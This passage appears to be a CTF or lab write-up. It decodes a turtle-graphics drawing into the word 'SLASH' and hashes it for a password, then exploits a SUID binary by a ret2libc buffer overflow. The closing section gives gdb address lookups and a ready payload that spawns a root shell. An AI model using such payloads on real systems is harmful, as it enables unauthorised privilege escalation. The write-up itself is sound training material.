t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(50)
turtle.done()
```

```py
import turtle 
s = turtle.getscreen()
t = turtle.Turtle()

t.speed(0)
t.fd(100)
t.bk(200)
t.fd(100)
t.rt(90)
t.fd(100)
t.rt(90)
t.fd(100)
t.bk(200)
turtle.done()
```

and they spell out `SLASH`  
the final message is `Can you digest the message? :)`

so by trying various encrpytion the one that work is
```
> echo -m "SLASH" | md5sum
646da671ca01bb5d84dbb5fb2238dc8e
```

## Buffer overflow 
we got a binary with suid permission bit so this will be execute as root. with ltrace we see that it use the strcpy which can be expliot for buffer overflow.

https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc

1. find the size of the buffer to be overflow 
2. find the system() address
3. find the exit() address
4. find the /bin/sh address inside the libc

using gdb we can
```
gdb ./expliot_me
(gdb) b main
(gdb) r
```
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
0xb7e6b060
```
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```
```


(gdb) info proc map
process 2598
Mapped address spaces:
        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

address:
system | 0xb7e6b060 | \x60\xb0\xe6\xb7
exit  | 0xb7e5ebe0 | \xe0\xeb\xe5\xb7
libc + /bin/sh | 0xb7e2c000 + 0x160c58 = 0xB7F8CC58 | \x58\xcc\xf8\xb7

so the final payload is
```
./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
``` 

and now we have sh as root